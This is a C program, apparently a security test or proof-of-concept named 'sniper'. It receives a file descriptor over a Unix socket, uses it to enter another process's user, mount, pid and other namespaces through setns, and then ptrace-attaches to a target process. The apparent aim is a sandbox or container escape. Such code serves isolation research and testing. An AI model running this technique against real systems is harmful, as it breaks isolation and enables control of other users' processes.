#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sched.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include "report.h"

char * socket_path = "socket";

void my_err(char * msg)
{
    write_error("sniper", msg);
}
void my_log(char * msg, int arg)
{
    write_log("sniper", msg, arg);
}

int main(int argc, char * argv[])
{
	struct sockaddr_un addr;
	char buf[100];
	int fd,rc, cl;
    report("sniper");
	if ( (fd = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) {
		my_err("socket error");
		exit(-1);
	}

	memset(&addr, 0, sizeof(addr));
	addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, socket_path, sizeof(addr.sun_path));

    my_log("binding", 0);
	if (bind(fd, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
		my_err("bind error");
		exit(-1);
	}

    my_log("listening", 0);
	if (listen(fd, 5) == -1) {
		my_err("listen error");
		exit(-1);
	}

    my_log("accepting", 0);
	if ( (cl = accept(fd, NULL, NULL)) == -1) {
		my_err("accept error");
		return -1;
	}

    my_log("recving", 0);
	int remote_fd = recv_fd(cl);
    my_log("recved fd", remote_fd);

    char * NSS[] = {"user", "mnt", "pid", "uts", "ipc", "cgroup"};
    char path[1024];
    for (int i = 0; i < 6; i++)
    {
        snprintf(path, 1024, "proc/10/ns/%s", NSS[i]);
        my_log(NSS[i], 0);
        int ns = openat(remote_fd, path, 0);
        if (ns < 0)
        {
            my_err("openat");
        }
        int ret = setns(ns, 0);
        if (ret < 0)
        {
            my_err("setns user");
        }
    }
    report("sniper");

    int ret = -1;
    time_t start = time(NULL);
    while(ret < 0 && (time(NULL) - start) < 15)
    {
        ret = ptrace(PTRACE_ATTACH, 5, NULL, NULL);
        if (errno != 3)
            break;
    }
	if (ret < 0)
	{
        my_err("ptrace attach");
    }
    my_log("attached", 0);

    sleep(3000);
}
